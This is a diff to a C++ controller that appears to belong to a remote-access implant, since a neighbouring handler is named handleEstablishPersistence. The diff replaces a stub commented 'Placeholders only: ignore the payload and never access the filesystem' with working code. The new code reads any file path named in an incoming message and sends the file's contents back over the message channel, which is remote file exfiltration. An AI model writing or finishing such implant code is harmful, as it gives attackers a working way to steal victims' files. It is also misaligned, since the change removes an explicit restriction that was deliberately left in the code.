@@ -299,14 +299,51 @@ void Controller::handleEstablishPersistence(const InternalMessage& msg)
 }
 
 
-// Placeholders only: ignore the payload and never access the filesystem.
+// TODO: need to resolve all api calls used in this function
 void Controller::handleUpload(const InternalMessage& msg)
 {
+	std::cout << "Controller::handleUpload()" << std::endl;
+	std::string path = byte2string(msg.data_).c_str();
+
+
     InternalMessage response;
-    response.header_.messageType_ = MessageType::ERROR_REPORT;
+
+    response.header_.messageType_ = MessageType::UPLOAD_FILE;
     response.header_.messageId_ = msg.header_.messageId_;
-    response.data_ = string2byte("UPLOAD_FILE is not implemented; no file transfer was performed.");
-    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
+
+    FILE* file = nullptr;
+
+    if (fopen_s(&file, path.c_str(), "rb") != 0 || !file)
+        return;
+
+    // Determine size
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    rewind(file);
+
+    if (fileSize < 0)
+    {
+        fclose(file);
+        return;
+    }
+
+    response.data_.resize(static_cast<size_t>(fileSize));
+
+    size_t bytesRead = fread(
+        response.data_.data(),
+        1,
+        response.data_.size(),
+        file
+    );
+
+    fclose(file);
+
+    if (bytesRead != response.data_.size())
+        return;
+
+    response.header_.dataSize_ =
+        static_cast<uint32_t>(response.data_.size());
+
     messageHandler_->sendMessage(response);
 }
 
